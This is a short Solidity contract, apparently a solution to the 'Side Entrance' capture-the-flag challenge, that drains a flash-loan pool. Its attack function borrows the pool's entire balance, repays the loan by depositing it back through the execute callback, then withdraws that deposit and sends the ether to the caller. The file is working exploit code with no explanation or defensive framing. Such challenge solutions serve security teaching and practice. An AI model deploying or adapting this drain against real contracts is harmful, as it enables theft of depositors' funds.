pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract SideEntranceAttacker {

    address private pool;

    constructor(address poolAddress) {
        pool = poolAddress;
    }

    function execute() external payable{
        IPool(pool).deposit{value:msg.value}();
    }

    function attack() public {
        uint256 amount = pool.balance;
        IPool(pool).flashLoan(amount);
        IPool(pool).withdraw();
        address payable receiver = payable(msg.sender);
        receiver.transfer(amount);
    }

    receive() external payable {}

}